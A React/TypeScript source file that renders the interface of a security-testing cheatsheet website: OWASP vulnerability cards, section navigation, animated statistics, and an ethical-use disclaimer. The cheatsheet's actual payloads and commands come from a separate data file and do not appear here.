const OWASPCard = memo(({ vuln, defaultOpen }: { vuln: OWASPVulnerability; defaultOpen: boolean }) => {
  const [open, setOpen] = useState(defaultOpen);
  const sev = getSev(vuln.severity);
  return (
    <motion.div variants={fadeUp} className="rounded-lg overflow-hidden"
      style={{ background: "rgba(5,8,0,0.85)", border: "1px solid rgba(255,170,0,.18)" }}
      whileHover={{ borderColor: "rgba(255,170,0,.35)", boxShadow: "0 0 24px rgba(255,170,0,.07)" }}>
      <div className="relative overflow-hidden" style={{ height: 1 }}>
        <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 3, repeat: Infinity, repeatDelay: 5, ease: "easeInOut" }}
          className="absolute inset-y-0 w-1/2"
          style={{ background: "linear-gradient(90deg, transparent, rgba(255,170,0,.7), transparent)" }} />
      </div>
      <button onClick={() => setOpen(v => !v)} className="w-full flex items-start justify-between px-4 py-3 nav-sweep text-left"
        style={{ background: "transparent", cursor: "pointer" }}>
        <div className="flex items-start gap-3 min-w-0">
          <span className="font-bold shrink-0" style={{ fontSize: 22, fontFamily: "monospace", color: "rgba(255,170,0,.3)", lineHeight: 1, marginTop: 2 }}>
            {String(vuln.rank).padStart(2, "0")}
          </span>
          <div className="min-w-0">
            <h3 className="orbit font-bold" style={{ fontSize: 13, color: "#ffaa00", textShadow: "0 0 8px rgba(255,170,0,.2)" }}>{vuln.name}</h3>
            <p className="mono mt-0.5" style={{ fontSize: 10, color: "rgba(255,170,0,.38)" }}>{vuln.description}</p>
          </div>
        </div>
        <div className="flex items-center gap-2 shrink-0 ml-3">
          <span className={`orbit font-bold rounded px-2 py-0.5 ${sev.cls}`}
            style={{ fontSize: 9, background: sev.bg, border: `1px solid ${sev.border}` }}>
            {(vuln.severity ?? "HIGH").toUpperCase()}
          </span>
          <span className={`toggle-icon text-xs ${open ? "open" : ""}`} style={{ color: "rgba(255,255,255,.28)" }}>▶</span>
        </div>
      </button>
      <AnimatePresence initial={false}>
        {open && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}
            transition={{ duration: .25, ease: "easeInOut" }} style={{ overflow: "hidden" }}>
            <div className="px-4 pb-4 flex flex-col gap-3">
              {(vuln.examples as string[] | undefined)?.length && (
                <div>
                  <DividerLabel label="EXAMPLES" color="#ffaa00" />
                  <ul className="flex flex-col gap-1">
                    {(vuln.examples as string[]).map((ex, i) => (
                      <li key={i} className="mono flex gap-2 break-words" style={{ fontSize: 11, color: "rgba(255,170,0,.6)" }}>
                        <span style={{ opacity: .4 }}>▸</span>{ex}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
              {(vuln.types as string[] | undefined)?.length && (
                <div>
                  <DividerLabel label="TYPES" color="#ffaa00" />
                  <div className="flex flex-wrap gap-2">
                    {(vuln.types as string[]).map((t, i) => (
                      <span key={i} className="mono rounded px-2 py-1"
                        style={{ fontSize: 10, background: "rgba(255,170,0,.07)", color: "rgba(255,170,0,.55)", border: "1px solid rgba(255,170,0,.15)" }}>
                        {t}
                      </span>
                    ))}
                  </div>
                </div>
              )}
              {vuln.testMethods?.length && (
                <div>
                  <DividerLabel label="TEST METHODS" color="#ffaa00" />
                  <ul className="flex flex-col gap-1">
                    {vuln.testMethods.map((m, i) => (
                      <li key={i} className="mono flex gap-2 break-words" style={{ fontSize: 11, color: "rgba(255,170,0,.6)" }}>
                        <span style={{ opacity: .4 }}>▸</span>{m}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
              {vuln.payloads?.length && (
                <div>
                  <DividerLabel label="PAYLOADS" color="#ff8800" />
                  <div className="flex flex-col gap-2">
                    {vuln.payloads.map((p, i) => <PayloadBlock key={i} payload={p.payload} description={p.description} context={p.context} />)}
                  </div>
                </div>
              )}
              {(vuln.tools as string[] | undefined)?.length && (
                <div>
                  <DividerLabel label="TOOLS" color="#ffaa00" />
                  <div className="flex flex-wrap gap-2">
                    {(vuln.tools as string[]).map((t, i) => (
                      <span key={i} className="mono rounded px-2 py-1"
                        style={{ fontSize: 10, background: "rgba(0,238,255,.06)", color: "rgba(0,238,255,.5)", border: "1px solid rgba(0,238,255,.14)" }}>
                        $ {t}
                      </span>
                    ))}
                  </div>
                </div>
              )}
              {vuln.covered && <p className="mono italic mt-1" style={{ fontSize: 10, color: "rgba(255,170,0,.3)" }}>📍 {vuln.covered}</p>}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
});
OWASPCard.displayName = "OWASPCard";

/* ─────────────────────────────────────────────────────────
   SECTION CONTENT
───────────────────────────────────────────────────────── */
const SectionContent = memo(({ section }: { section: Section }) => (
  <motion.div variants={stagger} initial="hidden" animate="visible" className="flex flex-col gap-4">
    {section.subsections?.map((sub, i) => (
      <motion.div key={i} variants={fadeUp} className="rounded-xl overflow-hidden"
        style={{ background: "var(--bg1)", border: "1px solid rgba(0,255,231,.09)" }}>
        <div className="relative px-5 py-3.5 overflow-hidden"
          style={{ borderBottom: "1px solid rgba(0,255,231,.07)", background: "rgba(0,255,231,.02)" }}>
          <div className="absolute inset-0 pointer-events-none"
            style={{ background: "radial-gradient(ellipse at 0% 50%, rgba(0,255,231,.03), transparent 70%)" }} />
          <div className="absolute top-0 left-0 right-0 h-px overflow-hidden">
            <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 3, repeat: Infinity, repeatDelay: 6, ease: "easeInOut" }}
              className="absolute inset-y-0 w-1/3"
              style={{ background: "linear-gradient(90deg, transparent, rgba(0,255,231,.5), transparent)" }} />
          </div>
          <h3 className="orbit font-bold relative z-10"
            style={{ fontSize: "clamp(.9rem,2vw,1.1rem)", color: "var(--cyan)", letterSpacing: ".04em" }}>
            {sub.subtitle}
          </h3>
          {sub.description && (
            <p className="mono mt-0.5 relative z-10" style={{ fontSize: 10, opacity: .35 }}>{sub.description}</p>
          )}
        </div>
        <div className="p-5 flex flex-col gap-3">
          {sub.tools?.map((t, j) => <ToolCard key={j} tool={t} />)}
          {sub.vulnerabilities?.map((v, j) => <VulnCard key={j} vuln={v} />)}
        </div>
      </motion.div>
    ))}
    {section.vulnerabilities && (
      <div className="flex flex-col gap-3">
        {section.vulnerabilities.map((v, i) => <OWASPCard key={i} vuln={v} defaultOpen={i === 0} />)}
      </div>
    )}
    {section.ports && <PortGrid ports={section.ports} />}
  </motion.div>
));
SectionContent.displayName = "SectionContent";

/* ─────────────────────────────────────────────────────────
   STATS COUNTER
───────────────────────────────────────────────────────── */
const Counter = ({ end, suffix = "" }: { end: number; suffix?: string }) => {
  const [count, setCount] = useState(0);
  const ref = useRef<HTMLSpanElement>(null);
  useEffect(() => {
    const observer = new IntersectionObserver(([e]) => {
      if (!e.isIntersecting) return;
      let val = 0;
      const step = end / 60;
      const id = setInterval(() => {
        val += step;
        if (val >= end) { setCount(end); clearInterval(id); } else setCount(Math.floor(val));
      }, 16);
    }, { threshold: .5 });
    if (ref.current) observer.observe(ref.current);
    return () => observer.disconnect();
  }, [end]);
  return <span ref={ref}>{count}{suffix}</span>;
};

const STATS = [
  { val: 6,   suffix: "",  label: "Phases",    color: "#00ffe7" },
  { val: 60,  suffix: "+", label: "Tools",     color: "#3b82f6" },
  { val: 250, suffix: "+", label: "Commands",  color: "#a855f7" },
  { val: 100, suffix: "%", label: "Free",      color: "#00ffe7" },
];

const StatBar = () => (
  <motion.div variants={stagger} initial="hidden" whileInView="visible" viewport={{ once: true }}
    className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-10">
    {STATS.map((s) => (
      <motion.div key={s.label} variants={fadeUp} className="relative rounded-xl p-4 overflow-hidden"
        style={{ background: "rgba(0,0,0,.5)", border: "1px solid rgba(255,255,255,.06)" }}
        whileHover={{ borderColor: `${s.color}40`, boxShadow: `0 0 25px ${s.color}15` }}>
        <div className="absolute top-0 left-0 right-0 h-px" style={{ background: `linear-gradient(to right, ${s.color}, transparent)` }} />
        <div className="orbit font-black mb-0.5" style={{ fontSize: 28, color: s.color, textShadow: `0 0 20px ${s.color}40` }}>
          <Counter end={s.val} suffix={s.suffix} />
        </div>
        <div className="mono" style={{ fontSize: 10, color: "#6b7280" }}>{s.label}</div>
      </motion.div>
    ))}
  </motion.div>
);

/* ─────────────────────────────────────────────────────────
   ETHICAL USE BANNER
───────────────────────────────────────────────────────── */
const EthicalBanner = () => (
  <motion.div variants={fadeUp} initial="hidden" whileInView="visible" viewport={{ once: true }}
    className="relative overflow-hidden rounded-2xl border-2 p-6 mt-10"
    style={{ background: "linear-gradient(135deg, rgba(255,45,85,.08), rgba(0,0,0,.8))", borderColor: "rgba(255,45,85,.3)", boxShadow: "0 8px 40px rgba(255,45,85,.12)" }}>
    <CyberCorner pos="tl" color="rgba(255,45,85,.5)" />
    <CyberCorner pos="tr" color="rgba(255,45,85,.5)" />
    <CyberCorner pos="bl" color="rgba(255,45,85,.5)" />
    <CyberCorner pos="br" color="rgba(255,45,85,.5)" />
    <div className="absolute top-0 left-0 right-0 h-px" style={{ background: "linear-gradient(to right, rgba(255,45,85,.6), transparent)" }} />
    <div className="flex items-start gap-4 mb-4">
      <div className="text-4xl select-none">⚠️</div>
      <div>
        <div className="flex items-center gap-3 mb-1">
          <h3 className="orbit font-bold" style={{ fontSize: "clamp(1rem,2.5vw,1.3rem)", color: "var(--red)" }}>
            Ethical Use &amp; Legal Disclaimer
          </h3>
          <span className="mono px-2 py-0.5 rounded border text-xs font-bold"
            style={{ color: "var(--red)", borderColor: "rgba(255,45,85,.35)", background: "rgba(255,45,85,.08)" }}>CRITICAL</span>
        </div>
        <div className="h-0.5 w-20 rounded-full" style={{ background: "linear-gradient(to right, var(--red), #f97316)" }} />
      </div>
    </div>
    <div className="flex flex-col gap-3 text-sm leading-relaxed" style={{ color: "#9ca3af" }}>
      <div className="flex items-start gap-3">
        <CheckIcon size={14} style={{ color: "var(--green)", marginTop: 2, flexShrink: 0 }} />
        <p>Provided for <span style={{ color: "#fff", fontWeight: 600 }}>educational purposes</span> and <span style={{ color: "#fff", fontWeight: 600 }}>authorized security testing</span> only.</p>
      </div>
      <div className="flex items-start gap-3">
        <X size={14} style={{ color: "#f87171", marginTop: 2, flexShrink: 0 }} />
        <p>Unauthorized use is <span className="orbit font-bold" style={{ color: "var(--red)" }}>ILLEGAL</span> and may result in <span style={{ color: "var(--red)" }}>criminal prosecution</span>.</p>
      </div>
      <div className="grid md:grid-cols-2 gap-3 p-3 rounded-lg border" style={{ background: "rgba(0,0,0,.3)", borderColor: "rgba(255,45,85,.12)" }}>
        <div>
          <h4 className="mono font-semibold mb-2 text-xs" style={{ color: "var(--green)" }}>✓ ACCEPTABLE</h4>
          <ul className="flex flex-col gap-1 mono" style={{ fontSize: 10, color: "#6b7280" }}>
            {["Controlled lab environments", "Systems you own / have written permission", "Authorized bug bounty programs", "Security research with ethical approval"]
              .map((x, i) => <li key={i} className="flex items-start gap-1.5"><span style={{ color: "var(--green)" }}>•</span>{x}</li>)}
          </ul>
        </div>
        <div>
          <h4 className="mono font-semibold mb-2 text-xs" style={{ color: "var(--red)" }}>✗ PROHIBITED</h4>
          <ul className="flex flex-col gap-1 mono" style={{ fontSize: 10, color: "#6b7280" }}>
            {["Unauthorized access to any system", "Exploiting systems without permission", "Distributing malware or malicious tools", "Stealing or leaking sensitive data"]
              .map((x, i) => <li key={i} className="flex items-start gap-1.5"><span style={{ color: "var(--red)" }}>•</span>{x}</li>)}
          </ul>
        </div>
      </div>
    </div>
  </motion.div>
);

/* ─────────────────────────────────────────────────────────
   MAIN CHEATSHEET COMPONENT
───────────────────────────────────────────────────────── */
export default function Cheatsheet() {
  const [active, setActive] = useState(0);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const topRef = useRef<HTMLDivElement>(null);

  const sections: Section[] = cheatsheetData.sections;
  const total = sections.length;
  const cur   = sections[active];
  const pct   = Math.round(((active + 1) / total) * 100);

  const goTo = useCallback((idx: number) => {
    setActive(idx);
    setDrawerOpen(false);
    setTimeout(() => topRef.current?.scrollIntoView({ behavior: "smooth", block: "start" }), 60);
  }, []);

  const NavButton = useCallback(({ i, s }: { i: number; s: Section }) => (
    <motion.button whileHover={{ x: 3 }} transition={{ duration: .12 }} onClick={() => goTo(i)}
      className="nav-sweep w-full text-left px-3 py-2.5 rounded-lg transition-colors"
      style={{ background: i === active ? "rgba(0,255,231,.1)" : "transparent", border: `1px solid ${i === active ? "rgba(0,255,231,.3)" : "transparent"}`, cursor: "pointer", position: "relative" }}>
      <div className="flex items-center gap-2">
        <span className="mono" style={{ fontSize: 11, width: 18, textAlign: "right", color: "rgba(0,255,231,.25)" }}>
          {String(i + 1).padStart(2, "0")}
        </span>
        <span className="mono flex-1 leading-snug text-left"
          style={{ fontSize: 11, color: i === active ? "var(--cyan)" : "rgba(0,255,231,.42)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
          {s.title}
        </span>
        {i === active && (
          <motion.span initial={{ opacity: 0, x: -4 }} animate={{ opacity: 1, x: 0 }} className="mono" style={{ fontSize: 10, color: "var(--cyan-d)" }}>◀</motion.span>
        )}
      </div>
      {i === active && (
        <motion.div layoutId="activeBar" className="absolute left-0 top-1 bottom-1 w-0.5 rounded-full"
          style={{ background: "var(--cyan)", boxShadow: "0 0 8px var(--cyan)" }} />
      )}
    </motion.button>
  ), [active, goTo]);

  return (
    // ✅ CHANGED: background was "var(--bg)" which resolved to "#020509" (solid black)
    // Now --bg is "transparent" in :root AND we set it explicitly here too for clarity
    <motion.div variants={pageFade} initial="hidden" animate="visible"
      style={{ background: "transparent", fontFamily: "'Rajdhani', sans-serif", color: "var(--cyan)", minHeight: "100vh" }}>
      <style dangerouslySetInnerHTML={{ __html: GLOBAL_CSS }} />

      <ParticleField />

      <div className="fixed inset-0 pointer-events-none" style={{ zIndex: 1 }}>
        <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse at 15% 0%, rgba(0,255,231,.06), transparent 50%)" }} />
        <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse at 85% 55%, rgba(59,130,246,.06), transparent 50%)" }} />
        <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse at 50% 100%, rgba(168,85,247,.04), transparent 50%)" }} />
        <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse at center, transparent 38%, rgba(0,0,0,.65) 100%)" }} />
      </div>

      <div className="scan-beam fixed left-0 right-0 h-0.5 pointer-events-none"
        style={{ zIndex: 2, background: "linear-gradient(90deg, transparent, rgba(0,255,231,.13), transparent)" }} />

      {/* ── HEADER ── */}
      {/* ✅ CHANGED: header background was "rgba(2,5,9,.96)" — kept as semi-transparent for readability */}
      <header className="sticky top-0 backdrop-blur-md" style={{ zIndex: 50, background: "rgba(2,5,9,.85)", borderBottom: "1px solid rgba(0,255,231,.1)" }}>
        <div className="relative overflow-hidden" style={{ height: 1 }}>
          <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 4, repeat: Infinity, repeatDelay: 3, ease: "easeInOut" }}
            className="absolute inset-y-0 w-1/3" style={{ background: "linear-gradient(90deg, transparent, rgba(0,255,231,.8), transparent)" }} />
        </div>
        <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 py-3 sm:py-4">
          <div className="flex items-center justify-between gap-3">
            <div className="min-w-0 flex-1">
              <div className="flex items-center gap-2 mb-0.5">
                <motion.div animate={{ opacity: [1, 0, 1] }} transition={{ duration: 1, repeat: Infinity }}
                  className="w-1.5 h-1.5 rounded-full shrink-0" style={{ background: "var(--cyan)" }} />
                <span className="mono hidden sm:inline" style={{ fontSize: 9, letterSpacing: ".28em", color: "rgba(0,255,231,.38)" }}>
                  SECURITY TOOLKIT v3.0
                </span>
              </div>
              <h1 className="neon-text orbit font-black truncate" style={{ fontSize: "clamp(1rem,2.5vw,1.4rem)", letterSpacing: ".03em" }}>
                {cheatsheetData.title}
              </h1>
            </div>
            <div className="hidden lg:flex items-center gap-3 shrink-0">
              <div className="flex items-center gap-2">
                <div className="w-28 h-1.5 rounded-full" style={{ background: "rgba(0,255,231,.1)" }}>
                  <div className="prog-fill rounded-full" style={{ width: `${pct}%` }} />
                </div>
                <span className="mono" style={{ fontSize: 10, color: "rgba(0,255,231,.35)" }}>{pct}%</span>
              </div>
              <div className="rounded-lg px-3 py-1.5" style={{ background: "rgba(0,255,231,.05)", border: "1px solid rgba(0,255,231,.18)" }}>
                <span className="orbit font-bold" style={{ fontSize: 13, color: "var(--cyan)" }}>
                  {String(active + 1).padStart(2, "0")} / {String(total).padStart(2, "0")}
                </span>
              </div>
            </div>
            <motion.button whileTap={{ scale: .9 }} onClick={() => setDrawerOpen(v => !v)}
              className="lg:hidden rounded-lg p-2.5"
              style={{ background: "transparent", border: "1px solid rgba(0,255,231,.2)", color: "var(--cyan)", cursor: "pointer" }}
              aria-label="Toggle menu">
              {drawerOpen
                ? <X size={18} />
                : <svg width={18} height={18} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 6h16M4 12h16M4 18h16" />
                  </svg>}
            </motion.button>
          </div>
          <div className="lg:hidden mt-2.5 flex items-center gap-3">
            <div className="flex-1 h-1 rounded-full" style={{ background: "rgba(0,255,231,.1)" }}>
              <div className="prog-fill rounded-full" style={{ width: `${pct}%` }} />
            </div>
            <span className="mono" style={{ fontSize: 10, color: "rgba(0,255,231,.35)" }}>
              {String(active + 1).padStart(2, "0")}/{String(total).padStart(2, "0")}
            </span>
          </div>
        </div>
      </header>

      {/* ── MOBILE DRAWER ── */}
      <AnimatePresence>
        {drawerOpen && (
          <>
            <motion.div key="overlay" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              transition={{ duration: .18 }} className="lg:hidden fixed inset-0"
              style={{ background: "rgba(0,0,0,.8)", backdropFilter: "blur(4px)", zIndex: 60 }}
              onClick={() => setDrawerOpen(false)} />
            <motion.div key="drawer" variants={drawerVariants} initial="hidden" animate="visible" exit="exit"
              className="lg:hidden fixed left-0 top-0 bottom-0 overflow-y-auto flex flex-col"
              style={{ width: 260, background: "rgba(0,8,13,0.97)", borderRight: "1px solid rgba(0,255,231,.14)", zIndex: 70 }}>
              <div className="flex items-center justify-between px-4 py-4" style={{ borderBottom: "1px solid rgba(0,255,231,.1)" }}>
                <span className="orbit font-bold" style={{ fontSize: 13, color: "var(--cyan)" }}>MODULES</span>
                <button onClick={() => setDrawerOpen(false)}
                  style={{ background: "none", border: "none", color: "rgba(0,255,231,.5)", cursor: "pointer", fontSize: 18 }}>✕</button>
              </div>
              <nav className="flex-1 p-3 flex flex-col gap-0.5">
                {sections.map((s, i) => <NavButton key={i} i={i} s={s} />)}
              </nav>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* ── BODY ── */}
      <div className="relative max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 py-5 flex gap-6 lg:gap-8" style={{ zIndex: 10 }}>

        {/* ── SIDEBAR ── */}
        <aside className="hidden lg:flex flex-col shrink-0 gap-3" style={{ width: 210, minWidth: 180 }}>
          <div className="sticky top-20 flex flex-col gap-3 overflow-y-auto" style={{ maxHeight: "calc(100vh - 6rem)" }}>
            <p className="mono px-1" style={{ fontSize: 9, letterSpacing: ".25em", color: "rgba(0,255,231,.22)" }}>MODULES ({total})</p>
            <div className="flex items-center gap-2">
              <div className="flex-1 h-1 rounded-full" style={{ background: "rgba(0,255,231,.1)" }}>
                <div className="prog-fill rounded-full" style={{ width: `${pct}%` }} />
              </div>
              <span className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.28)" }}>{pct}%</span>
            </div>
            <nav className="flex flex-col gap-0.5">
              {sections.map((s, i) => <NavButton key={i} i={i} s={s} />)}
            </nav>
          </div>
        </aside>

        {/* ── MAIN CONTENT ── */}
        <main className="flex-1 min-w-0 flex flex-col gap-4">
          <div ref={topRef} />

          {active === 0 && (
            <motion.div variants={stagger} initial="hidden" animate="visible" className="mb-2">
              <motion.div variants={fadeLeft} className="flex items-center gap-3 mb-6">
                <div className="flex items-center gap-2 px-3 py-1.5 rounded border"
                  style={{ borderColor: "rgba(0,255,231,.25)", background: "rgba(0,255,231,.05)", boxShadow: "0 0 18px rgba(0,255,231,.07)" }}>
                  <motion.span animate={{ opacity: [1, 0, 1] }} transition={{ duration: 1, repeat: Infinity }}
                    className="w-1.5 h-1.5 rounded-full" style={{ background: "var(--cyan)", display: "inline-block" }} />
                  <span className="mono" style={{ fontSize: 10, color: "var(--cyan)", letterSpacing: ".18em" }}>~/cheatsheet — ARSENAL LOADED</span>
                </div>
                <div className="h-px flex-1 max-w-[180px]" style={{ background: "linear-gradient(to right, rgba(0,255,231,.4), transparent)" }} />
              </motion.div>
              <motion.h1 variants={fadeUp} className="font-black leading-none tracking-tight mb-8 flicker"
                style={{ fontFamily: "'Orbitron', sans-serif", fontSize: "clamp(2.5rem,6vw,4.5rem)" }}>
                <span style={{ color: "#fff" }}>Cyber</span>
                <br />
                <span className="neon-text"
                  style={{ background: "linear-gradient(135deg, var(--cyan) 0%, var(--blue) 50%, var(--purple) 100%)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", backgroundClip: "text" }}>
                  Cheatsheet
                </span>
              </motion.h1>
              <motion.div variants={fadeUp} className="flex flex-wrap gap-2 mb-8">
                {["penetration-testing", "network-security", "osint", "web-security", "active-directory", "post-exploitation"].map(tag => (
                  <motion.span key={tag} whileHover={{ scale: 1.05, color: "var(--cyan)", borderColor: "rgba(0,255,231,.4)" }}
                    className="px-3 py-1 rounded border cursor-default mono"
                    style={{ fontSize: "0.7rem", color: "#4b5563", borderColor: "rgba(255,255,255,.06)", background: "rgba(255,255,255,.01)" }}>
                    #{tag}
                  </motion.span>
                ))}
              </motion.div>
              <motion.div variants={fadeUp}><StatBar /></motion.div>
            </motion.div>
          )}

          {/* Section header */}
          <motion.div key={`hdr-${active}`} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: .45 }}
            className="relative overflow-hidden rounded-xl px-5 sm:px-6 py-5"
            style={{ background: "rgba(0,255,231,.025)", border: "1px solid rgba(0,255,231,.14)" }}>
            <CyberCorner pos="tl" /> <CyberCorner pos="tr" /> <CyberCorner pos="bl" /> <CyberCorner pos="br" />
            <div className="absolute top-0 left-0 right-0 h-px overflow-hidden">
              <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 2, repeat: Infinity, repeatDelay: 4, ease: "easeInOut" }}
                className="absolute inset-y-0 w-1/3"
                style={{ background: "linear-gradient(90deg, transparent, rgba(0,255,231,.7), transparent)" }} />
            </div>
            <div className="absolute top-0 right-0 w-64 h-full pointer-events-none"
              style={{ background: "radial-gradient(ellipse at right, rgba(0,255,231,.03), transparent 70%)" }} />
            <div className="relative flex flex-wrap items-start justify-between gap-3">
              <div className="min-w-0">
                <div className="flex items-center gap-2 mb-1.5">
                  <div className="w-0.5 h-4 rounded-full" style={{ background: "var(--cyan)", boxShadow: "0 0 6px var(--cyan)" }} />
                  <span className="mono" style={{ fontSize: 9, letterSpacing: ".28em", color: "rgba(0,255,231,.38)" }}>
                    MODULE {String(active + 1).padStart(2, "0")} OF {String(total).padStart(2, "0")}
                  </span>
                </div>
                <h2 className="orbit font-black" style={{ fontSize: "clamp(1.1rem,2.5vw,1.6rem)", color: "var(--cyan)", letterSpacing: ".02em" }}>
                  {cur.title}
                </h2>
                {cur.description && (
                  <p className="mono mt-1.5 max-w-2xl leading-relaxed" style={{ fontSize: 11, color: "rgba(0,255,231,.32)" }}>{cur.description}</p>
                )}
              </div>
              <div className="flex items-center gap-2 shrink-0">
                <motion.button whileHover={{ scale: 1.04 }} whileTap={{ scale: .95 }} onClick={() => goTo(Math.max(0, active - 1))}
                  disabled={active === 0} className="rounded-lg px-3 py-2 mono text-xs transition-all disabled:opacity-20"
                  style={{ background: "rgba(0,255,231,.04)", border: "1px solid rgba(0,255,231,.15)", color: "var(--cyan)", cursor: "pointer" }}>
                  ◀ PREV
                </motion.button>
                <motion.button whileHover={{ scale: 1.04 }} whileTap={{ scale: .95 }} onClick={() => goTo(Math.min(total - 1, active + 1))}
                  disabled={active === total - 1} className="rounded-lg px-3 py-2 mono text-xs transition-all disabled:opacity-20"
                  style={{ background: "rgba(0,255,231,.04)", border: "1px solid rgba(0,255,231,.15)", color: "var(--cyan)", cursor: "pointer" }}>
                  NEXT ▶
                </motion.button>
              </div>
            </div>
          </motion.div>

          <SectionContent key={active} section={cur} />

          {active === total - 1 && <EthicalBanner />}

          {/* Bottom pagination */}
          <div className="flex items-center justify-between pt-4" style={{ borderTop: "1px solid rgba(0,255,231,.07)" }}>
            <motion.button whileHover={{ scale: 1.03 }} whileTap={{ scale: .95 }} onClick={() => goTo(Math.max(0, active - 1))}
              disabled={active === 0} className="rounded-lg px-4 py-2.5 mono text-xs transition-all disabled:opacity-20"
              style={{ background: "rgba(0,255,231,.04)", border: "1px solid rgba(0,255,231,.13)", color: "var(--cyan)", cursor: "pointer" }}>
              ◀ PREV MODULE
            </motion.button>
            <div className="hidden sm:flex items-center gap-1.5 flex-wrap justify-center max-w-xs">
              {sections.map((_, i) => (
                <motion.button key={i} onClick={() => goTo(i)} animate={{ width: i === active ? 18 : 7 }} transition={{ duration: .2 }}
                  style={{ height: 7, borderRadius: 3.5, background: i === active ? "var(--cyan)" : "rgba(0,255,231,.2)", boxShadow: i === active ? "0 0 8px var(--cyan)" : "none", border: "none", cursor: "pointer", flexShrink: 0 }} />
              ))}
            </div>
            <motion.button whileHover={{ scale: 1.03 }} whileTap={{ scale: .95 }} onClick={() => goTo(Math.min(total - 1, active + 1))}
              disabled={active === total - 1} className="rounded-lg px-4 py-2.5 mono text-xs transition-all disabled:opacity-20"
              style={{ background: "rgba(0,255,231,.04)", border: "1px solid rgba(0,255,231,.13)", color: "var(--cyan)", cursor: "pointer" }}>
              NEXT MODULE ▶
            </motion.button>
          </div>
        </main>
      </div>

      {/* ── FOOTER ── */}
      {/* ✅ CHANGED: background was "rgba(0,0,0,.55)" — reduced to .35 to let MatrixRain show through */}
      <footer className="relative overflow-hidden mt-8 py-6 text-center"
        style={{ borderTop: "1px solid rgba(0,255,231,.08)", background: "rgba(0,0,0,.35)", zIndex: 10 }}>
        <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 5, repeat: Infinity, repeatDelay: 2, ease: "easeInOut" }}
          className="absolute top-0 left-0 h-px w-1/3"
          style={{ background: "linear-gradient(to right, transparent, rgba(0,255,231,.6), transparent)" }} />
        <p className="orbit font-bold tracking-widest" style={{ fontSize: 11, color: "var(--red)", textShadow: "0 0 6px rgba(255,45,85,.35)" }}>
          ⚠ FOR AUTHORIZED SECURITY TESTING ONLY ⚠
        </p>
        <p className="mono mt-1" style={{ fontSize: 10, color: "rgba(0,255,231,.18)" }}>
          Always obtain written authorization before testing any system
        </p>
      </footer>
    </motion.div>
  );
}